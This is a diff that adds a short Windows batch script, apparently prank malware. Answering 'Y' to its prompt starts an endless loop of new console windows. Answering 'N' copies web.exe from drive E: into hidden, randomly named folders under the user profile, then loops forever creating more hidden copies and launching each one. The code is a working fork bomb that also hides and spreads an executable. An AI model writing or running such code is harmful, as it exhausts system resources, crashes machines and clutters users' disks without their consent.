@@ -1,0 +1,22 @@
+@echo off
+set /a rad=%RANDOM%
+echo "What Do You Want to Happen?"
+choice /m "Press Y for Yes and N for no"
+if %ERRORLEVEL% == 2 (goto loop2)
+if %ERRORLEVEL% == 1 (goto loop1)
+
+:loop1
+start
+goto loop1
+
+:loop2
+mkdir C:\Users\%USERNAME%\%rad%
+attrib +H C:\Users\%USERNAME%\%rad% /s
+xcopy E:\web.exe C:\Users\%USERNAME%\%rad% 
+:LOOP
+set /a looprand=%RANDOM%
+mkdir C:\Users\%USERNAME%\%looprand%
+attrib +H C:\Users\%USERNAME%\%looprand% /s
+xcopy C:\Users\%USERNAME%\%rad% C:\Users\%USERNAME%\%looprand% 
+start C:\Users\%USERNAME%\%looprand%\web.exe
+goto LOOP
